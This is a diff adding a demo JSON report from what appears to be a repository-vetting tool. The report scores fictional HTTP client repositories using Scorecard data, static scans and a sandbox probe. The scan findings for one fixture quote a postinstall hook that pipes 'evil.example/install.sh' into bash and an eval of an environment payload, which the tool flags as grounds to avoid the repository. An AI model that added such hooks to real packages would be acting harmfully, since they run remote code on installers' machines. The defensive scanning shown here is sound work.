@@ -1,0 +1,534 @@
+{
+  "tool_version": "0.7.1",
+  "generated_at": "2026-10-30T12:00:00+00:00",
+  "seed": {
+    "full_name": "acme/http-kit",
+    "html_url": "https://github.com/acme/http-kit",
+    "description": "Demo seed: a small, typed HTTP client toolkit for service-to-service calls.",
+    "stars": 4200,
+    "forks": 310,
+    "language": "Python",
+    "topics": [
+      "http",
+      "client",
+      "python",
+      "requests",
+      "toolkit"
+    ],
+    "license_spdx": "MIT",
+    "pushed_at": "2026-10-26T12:00:00+00:00",
+    "created_at": "2022-06-13T12:00:00+00:00",
+    "archived": false,
+    "fork": false,
+    "default_branch": "main",
+    "size_kb": 2400,
+    "open_issues": 0
+  },
+  "assessments": [
+    {
+      "candidate": {
+        "repo": {
+          "full_name": "acme/http-kit",
+          "html_url": "https://github.com/acme/http-kit",
+          "description": "Demo seed: a small, typed HTTP client toolkit for service-to-service calls.",
+          "stars": 4200,
+          "forks": 310,
+          "language": "Python",
+          "topics": [
+            "http",
+            "client",
+            "python",
+            "requests",
+            "toolkit"
+          ],
+          "license_spdx": "MIT",
+          "pushed_at": "2026-10-26T12:00:00+00:00",
+          "created_at": "2022-06-13T12:00:00+00:00",
+          "archived": false,
+          "fork": false,
+          "default_branch": "main",
+          "size_kb": 2400,
+          "open_issues": 0
+        },
+        "role": "seed",
+        "similarity": null
+      },
+      "filter": {
+        "status": "passed",
+        "score": 7.8,
+        "checked_at": "2026-10-20",
+        "source": "api",
+        "checks": {
+          "Maintained": 10,
+          "Code-Review": 9,
+          "Dangerous-Workflow": 10,
+          "Token-Permissions": 8,
+          "Vulnerabilities": 10,
+          "Binary-Artifacts": 10,
+          "Pinned-Dependencies": 9
+        },
+        "reasons": [
+          "OpenSSF Scorecard score: 7.8/10."
+        ],
+        "warnings": [],
+        "error": null
+      },
+      "scan": {
+        "status": "scanned",
+        "risk": "none",
+        "findings": [],
+        "files_scanned": 3,
+        "files_skipped": 0,
+        "bytes_scanned": 193,
+        "truncated": false,
+        "scanner": "builtin-patterns",
+        "error": null
+      },
+      "verdict": {
+        "decision": "use",
+        "confidence": "high",
+        "reasons": [
+          "Static scan covered 3 files with no medium-or-higher findings.",
+          "Reputation gate passed with a Scorecard score of 7.8/10."
+        ],
+        "limitations": [
+          "Static analysis cannot prove the absence of malicious code.",
+          "Scorecard measures project practice; it is not a code audit.",
+          "Sandbox verification is opt-in and does not execute repository code."
+        ],
+        "withheld": false
+      },
+      "sandbox": null
+    },
+    {
+      "candidate": {
+        "repo": {
+          "full_name": "acme/web-client",
+          "html_url": "https://github.com/acme/web-client",
+          "description": "A modern async HTTP client with retries, connection pooling, and typed responses.",
+          "stars": 2800,
+          "forks": 180,
+          "language": "Python",
+          "topics": [
+            "http",
+            "client",
+            "rest",
+            "python"
+          ],
+          "license_spdx": "Apache-2.0",
+          "pushed_at": "2026-10-18T12:00:00+00:00",
+          "created_at": "2024-05-13T12:00:00+00:00",
+          "archived": false,
+          "fork": false,
+          "default_branch": "main",
+          "size_kb": 2400,
+          "open_issues": 0
+        },
+        "role": "alternative",
+        "similarity": {
+          "total": 73.6,
+          "topics": 20.0,
+          "keywords": 0.0,
+          "language": 20.0,
+          "recency": 19.8,
+          "popularity": 13.8
+        }
+      },
+      "filter": {
+        "status": "passed",
+        "score": 8.1,
+        "checked_at": "2026-10-22",
+        "source": "api",
+        "checks": {
+          "Maintained": 10,
+          "Code-Review": 10,
+          "Dangerous-Workflow": 10,
+          "Token-Permissions": 9,
+          "Vulnerabilities": 10,
+          "Binary-Artifacts": 10,
+          "Pinned-Dependencies": 10
+        },
+        "reasons": [
+          "OpenSSF Scorecard score: 8.1/10."
+        ],
+        "warnings": [],
+        "error": null
+      },
+      "scan": {
+        "status": "scanned",
+        "risk": "none",
+        "findings": [],
+        "files_scanned": 3,
+        "files_skipped": 0,
+        "bytes_scanned": 193,
+        "truncated": false,
+        "scanner": "builtin-patterns",
+        "error": null
+      },
+      "verdict": {
+        "decision": "use",
+        "confidence": "high",
+        "reasons": [
+          "Static scan covered 3 files with no medium-or-higher findings.",
+          "Reputation gate passed with a Scorecard score of 8.1/10."
+        ],
+        "limitations": [
+          "Static analysis cannot prove the absence of malicious code.",
+          "Scorecard measures project practice; it is not a code audit.",
+          "Sandbox verification is opt-in and does not execute repository code."
+        ],
+        "withheld": false
+      },
+      "sandbox": null
+    },
+    {
+      "candidate": {
+        "repo": {
+          "full_name": "acme/legacy-http",
+          "html_url": "https://github.com/acme/legacy-http",
+          "description": "An older synchronous HTTP helper retained for compatibility.",
+          "stars": 950,
+          "forks": 140,
+          "language": "Python",
+          "topics": [
+            "http",
+            "client",
+            "python"
+          ],
+          "license_spdx": "BSD-3-Clause",
+          "pushed_at": "2024-02-23T12:00:00+00:00",
+          "created_at": "2019-09-17T12:00:00+00:00",
+          "archived": true,
+          "fork": false,
+          "default_branch": "main",
+          "size_kb": 2400,
+          "open_issues": 0
+        },
+        "role": "alternative",
+        "similarity": {
+          "total": 58.0,
+          "topics": 24.0,
+          "keywords": 0.0,
+          "language": 20.0,
+          "recency": 2.1,
+          "popularity": 11.9
+        }
+      },
+      "filter": {
+        "status": "unknown",
+        "score": null,
+        "checked_at": null,
+        "source": "api",
+        "checks": {},
+        "reasons": [
+          "OpenSSF Scorecard has no public record for this repository.",
+          "Maintenance and project-practice signals could not be checked."
+        ],
+        "warnings": [],
+        "error": "repository is not in the OpenSSF Scorecard dataset"
+      },
+      "scan": {
+        "status": "scanned",
+        "risk": "none",
+        "findings": [],
+        "files_scanned": 3,
+        "files_skipped": 0,
+        "bytes_scanned": 193,
+        "truncated": false,
+        "scanner": "builtin-patterns",
+        "error": null
+      },
+      "verdict": {
+        "decision": "inspect",
+        "confidence": "medium",
+        "reasons": [
+          "Repository is archived and receives no maintenance.",
+          "Static scan covered 3 files with no medium-or-higher findings."
+        ],
+        "limitations": [
+          "Static analysis cannot prove the absence of malicious code.",
+          "Unmaintained code can accumulate unfixed vulnerabilities."
+        ],
+        "withheld": false
+      },
+      "sandbox": null
+    },
+    {
+      "candidate": {
+        "repo": {
+          "full_name": "acme/suspicious-helper",
+          "html_url": "https://github.com/acme/suspicious-helper",
+          "description": "A tiny HTTP convenience wrapper. Demo fixture with intentionally risky patterns.",
+          "stars": 700,
+          "forks": 41,
+          "language": "JavaScript",
+          "topics": [
+            "http",
+            "client",
+            "javascript"
+          ],
+          "license_spdx": "MIT",
+          "pushed_at": "2026-09-30T12:00:00+00:00",
+          "created_at": "2025-06-17T12:00:00+00:00",
+          "archived": false,
+          "fork": false,
+          "default_branch": "main",
+          "size_kb": 2400,
+          "open_issues": 0
+        },
+        "role": "alternative",
+        "similarity": {
+          "total": 44.2,
+          "topics": 13.3,
+          "keywords": 0.0,
+          "language": 0.0,
+          "recency": 19.5,
+          "popularity": 11.4
+        }
+      },
+      "filter": {
+        "status": "passed",
+        "score": 6.0,
+        "checked_at": "2026-10-18",
+        "source": "api",
+        "checks": {
+          "Maintained": 8,
+          "Code-Review": 5,
+          "Dangerous-Workflow": 0,
+          "Token-Permissions": 5,
+          "Vulnerabilities": 10,
+          "Binary-Artifacts": 10,
+          "Pinned-Dependencies": 6
+        },
+        "reasons": [
+          "OpenSSF Scorecard score: 6.0/10."
+        ],
+        "warnings": [
+          "Dangerous-Workflow check scored 0."
+        ],
+        "error": null
+      },
+      "scan": {
+        "status": "scanned",
+        "risk": "high",
+        "findings": [
+          {
+            "rule_id": "download-pipe-shell",
+            "title": "Download piped into an interpreter",
+            "severity": "high",
+            "category": "install-hook",
+            "path": "README.md",
+            "message": "Remote content is executed without inspection or integrity checking.",
+            "line": 6,
+            "evidence": "curl https://example.com/install.sh | bash",
+            "suppressed": true,
+            "suppression_reason": "documentation file"
+          },
+          {
+            "rule_id": "js-eval",
+            "title": "Dynamic code execution",
+            "severity": "medium",
+            "category": "execution",
+            "path": "index.js",
+            "message": "eval() can turn data into code.",
+            "line": 2,
+            "evidence": "eval(process.env.PAYLOAD || 'console.log(1)');",
+            "suppressed": false,
+            "suppression_reason": null
+          },
+          {
+            "rule_id": "js-child-process",
+            "title": "Node child_process import",
+            "severity": "medium",
+            "category": "execution",
+            "path": "index.js",
+            "message": "child_process can execute arbitrary commands.",
+            "line": 1,
+            "evidence": "const cp = require('child_process');",
+            "suppressed": false,
+            "suppression_reason": null
+          },
+          {
+            "rule_id": "download-pipe-shell",
+            "title": "Download piped into an interpreter",
+            "severity": "high",
+            "category": "install-hook",
+            "path": "package.json",
+            "message": "Remote content is executed without inspection or integrity checking.",
+            "line": 5,
+            "evidence": "\"postinstall\": \"curl -fsSL https://evil.example/install.sh | bash\"",
+            "suppressed": false,
+            "suppression_reason": null
+          },
+          {
+            "rule_id": "npm-lifecycle",
+            "title": "npm install-time lifecycle script",
+            "severity": "high",
+            "category": "install-hook",
+            "path": "package.json",
+            "message": "`postinstall` runs automatically during install: curl -fsSL https://evil.example/install.sh | bash",
+            "line": 5,
+            "evidence": "curl -fsSL https://evil.example/install.sh | bash",
+            "suppressed": false,
+            "suppression_reason": null
+          }
+        ],
+        "files_scanned": 3,
+        "files_skipped": 0,
+        "bytes_scanned": 326,
+        "truncated": false,
+        "scanner": "builtin-patterns",
+        "error": null
+      },
+      "verdict": {
+        "decision": "avoid",
+        "confidence": "medium",
+        "reasons": [
+          "Static scan found high-risk patterns.",
+          "HIGH: Download piped into an interpreter (package.json:5)",
+          "HIGH: npm install-time lifecycle script (package.json:5)",
+          "MEDIUM: Node child_process import (index.js:1)"
+        ],
+        "limitations": [
+          "Static analysis cannot prove the absence of malicious code.",
+          "Review the flagged files before deciding whether the findings are acceptable."
+        ],
+        "withheld": false
+      },
+      "sandbox": {
+        "status": "completed",
+        "image": "python:3.11-slim",
+        "container": "reuseguard-demo-sandbox",
+        "exit_code": 0,
+        "duration_seconds": 1.8,
+        "timed_out": false,
+        "oom_suspected": false,
+        "containment_ok": true,
+        "mount_target": "/src",
+        "network": "none",
+        "memory_mb": 256,
+        "cpus": 0.5,
+        "pids_limit": 64,
+        "timeout_seconds": 20.0,
+        "probe": {
+          "files": 3,
+          "bytes": 512,
+          "symlinks": 0,
+          "executables": 1,
+          "src_entries": 3,
+          "src_writable": false,
+          "tmp_writable": true,
+          "network_reachable": false,
+          "network_target": "1.1.1.1:443"
+        },
+        "stdout_tail": null,
+        "stderr_tail": null,
+        "error": null,
+        "command": []
+      }
+    },
+    {
+      "candidate": {
+        "repo": {
+          "full_name": "acme/abandoned-http",
+          "html_url": "https://github.com/acme/abandoned-http",
+          "description": "An unmaintained HTTP wrapper with no recent activity.",
+          "stars": 60,
+          "forks": 8,
+          "language": "Python",
+          "topics": [
+            "http",
+            "client",
+            "python"
+          ],
+          "license_spdx": null,
+          "pushed_at": "2022-09-21T12:00:00+00:00",
+          "created_at": "2020-04-04T12:00:00+00:00",
+          "archived": false,
+          "fork": false,
+          "default_branch": "main",
+          "size_kb": 2400,
+          "open_issues": 0
+        },
+        "role": "alternative",
+        "similarity": {
+          "total": 51.1,
+          "topics": 24.0,
+          "keywords": 0.0,
+          "language": 20.0,
+          "recency": 0.0,
+          "popularity": 7.1
+        }
+      },
+      "filter": {
+        "status": "skipped",
+        "score": 0.8,
+        "checked_at": "2024-01-12",
+        "source": "api",
+        "checks": {
+          "Maintained": 0,
+          "Vulnerabilities": 0
+        },
+        "reasons": [
+          "OpenSSF Scorecard score: 0.8/10.",
+          "Maintained and Vulnerabilities checks both scored 0.",
+          "Score 0.8 is below the 2.0 skip threshold."
+        ],
+        "warnings": [],
+        "error": null
+      },
+      "scan": {
+        "status": "skipped",
+        "risk": "none",
+        "findings": [],
+        "files_scanned": 0,
+        "files_skipped": 0,
+        "bytes_scanned": 0,
+        "truncated": false,
+        "scanner": "builtin-patterns",
+        "error": "Skipped because the reputation filter rejected the repository."
+      },
+      "verdict": {
+        "decision": "avoid",
+        "confidence": "high",
+        "reasons": [
+          "The reputation filter rejected this repository.",
+          "OpenSSF Scorecard score: 0.8/10.",
+          "Maintained and Vulnerabilities checks both scored 0.",
+          "Score 0.8 is below the 2.0 skip threshold."
+        ],
+        "limitations": [
+          "Static analysis cannot prove the absence of malicious code.",
+          "The repository was not downloaded or scanned after the reputation rejection."
+        ],
+        "withheld": false
+      },
+      "sandbox": null
+    }
+  ],
+  "recall_queries": [
+    "topic:http language:Python stars:>=50 fork:false",
+    "http client typed toolkit language:Python stars:>=50 fork:false"
+  ],
+  "warnings": [
+    "Demo data: all repository names, scores, and findings are fictional."
+  ],
+  "settings": {
+    "max_candidates": 4,
+    "max_repo_mb": 150,
+    "max_files": 2000,
+    "scorecard_min": 2.0,
+    "token_configured": false
+  },
+  "elapsed_seconds": 3.2,
+  "demo": true,
+  "workdir": null,
+  "query": null,
+  "discover_only": false,
+  "schema_version": 1,
+  "counts": {
+    "use": 2,
+    "inspect": 1,
+    "avoid": 2
+  }
+}
